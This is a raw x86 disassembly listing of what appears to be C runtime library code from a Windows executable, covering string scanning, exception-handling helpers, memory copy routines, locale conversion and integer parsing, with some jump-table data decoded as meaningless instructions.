  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
